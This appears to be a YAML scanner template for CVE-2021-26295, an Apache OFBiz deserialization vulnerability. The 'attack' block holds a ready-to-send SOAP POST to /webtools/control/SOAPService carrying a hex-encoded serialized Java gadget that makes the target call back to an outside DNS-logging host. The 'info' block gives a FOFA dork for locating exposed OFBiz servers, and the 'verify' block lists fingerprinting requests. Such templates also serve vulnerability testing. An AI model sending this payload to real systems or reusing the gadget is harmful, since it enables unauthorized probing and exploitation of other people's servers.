attack:
  - request:
      data: '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
               <soapenv:Header/>
               <soapenv:Body>
               <ser>
                   <map-HashMap>
                       <map-Entry>
                           <map-Key>
                               <cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff7400103233663064352e646e736c6f672e636e74000071007e0005740004687474707078740017687474703a2f2f3233663064352e646e736c6f672e636e78</cus-obj>
                           </map-Key>
                           <map-Value>
                               <std-String value="http://23f0d5.dnslog.cn"/>
                           </map-Value>
                       </map-Entry>
                   </map-HashMap>
               </ser>
               </soapenv:Body>
               </soapenv:Envelope>'''
      header:
        Content-Type: application/xml
      method: POST
      path: /webtools/control/SOAPService
    response:
      content_list:
        - <soapenv:Envelope xmlns:soapenv=
        - Problem processing the service
        - errorMessage
        - responseMessage
      content_re:
        - 正则表达式
      header:
        - Content-Type
      status_code: '200'

dir_list:
- /
- /ofbiz
info:
  app_name: Apache OFbiz
  app_name_english: Apache OFbiz
  author: ki9mu
  cve: CVE-2021-26295
  cvnd:
  fofa_dork: app="Apache_OFBiz"
  shodan_dork: None
  version: '1.0'
  vul_name: Apache OFBiz rmi反序列化漏洞
  vul_type: 远程命令执行
  vul_type_english: rce

verify:
  - request:
      data: None
      header: None
      method: GET
      path: /tomahawk/images/ofbiz_logo.png
    response:
      content_list:
        - IHDR
        - EXtSoftware
        - Adobe
        - ImageReadyq
      content_re:
        - 正则表达式
      header: []
      status_code: '200'
  - request:
      data: None
      header: None
      method: GET
      path: /webtools/control/main
    response:
      content_list:
        - Web Tools Main Page
        - Skip navigation
        - default
        - Apache OFBiz
      content_re:
        - 正则表达式
      header: []
      status_code: '200'
  - request:
      data: None
      header: None
      method: GET
      path: /images/util.js
    response:
      content_list:
        - jQuery.ajaxSetup({
        - for(;;);
        - prefixes.length
        - data.substring
      content_re:
        - 正则表达式
      header:
        - Content-Type
      status_code: '200'
  - request:
      data: None
      header: None
      method: GET
      path: /webtools/
    response:
      content_list: None
      content_re:
        - 正则表达式
      header:
        - /control/main
      status_code: '302'